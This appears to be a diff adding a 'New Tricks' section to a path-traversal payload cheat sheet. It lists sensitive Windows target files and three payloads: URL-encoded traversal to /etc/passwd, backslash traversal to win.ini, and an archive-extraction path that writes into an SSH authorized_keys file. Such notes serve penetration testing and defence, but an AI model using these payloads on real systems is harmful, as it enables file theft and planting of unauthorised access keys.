@@ -94,3 +94,17 @@
 - `C:\\Windows\\system32\\drivers\\etc\\hosts`
 - `C:\\boot.ini`
 - `C:\\Users\\Administrator\\NTUser.dat`
+
+## New Tricks
+
+### Trick 1
+- Scenario: Static file route escaped web root via encoded traversal.
+- Payload: `..%2f..%2f..%2fetc/passwd`
+
+### Trick 2
+- Scenario: Windows path traversal worked with backslash normalization bug.
+- Payload: `..\..\..\Windows\win.ini`
+
+### Trick 3
+- Scenario: Archive extraction wrote SSH key into authorized_keys location.
+- Payload: `../../../../../home/app/.ssh/authorized_keys`
